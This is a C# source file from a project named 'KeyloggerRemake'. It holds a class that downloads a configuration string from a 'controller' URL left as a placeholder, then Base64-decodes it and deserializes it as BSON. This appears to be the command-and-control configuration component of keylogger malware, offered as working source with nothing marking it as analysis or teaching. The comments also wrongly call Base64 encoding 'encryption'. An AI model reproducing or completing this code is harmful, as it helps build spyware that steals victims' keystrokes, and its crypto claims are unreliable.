using System;
using System.Net;
using System.IO;
using Newtonsoft.Json;
using Newtonsoft.Json.Bson;

namespace KeyloggerRemake
{
    class classGetEncryption
    {
        //Gets the encrypted key (From the controller)
        public static string getEncryptedKey()
        {
            var strEncryptedFile = "ADDYOURURLHERE"; //MUST BE A DIRECT-DOWNLOAD LINK!
            var strEncryptedKey = "";

            using (WebClient wc = new WebClient())
            {
                strEncryptedKey = wc.DownloadString(strEncryptedFile); //Downloads the encrypted key
            }

            return strEncryptedKey; //Returns the downloaded encrypted key
        }

        //Decrypts the encrypted key once called
        public static classJsonObj.classJson decryptBson(string strKey)
        {
            byte[] data = Convert.FromBase64String(strKey); //Base64 encryption

            MemoryStream ms = new MemoryStream(data);
            using (BsonReader reader = new BsonReader(ms)) //Reads the encrypted data
            {
                JsonSerializer serializer = new JsonSerializer();

                return serializer.Deserialize<classJsonObj.classJson>(reader); //Decrypts the encrypted data and seralizes it and returns it
            }
        }
    }
}
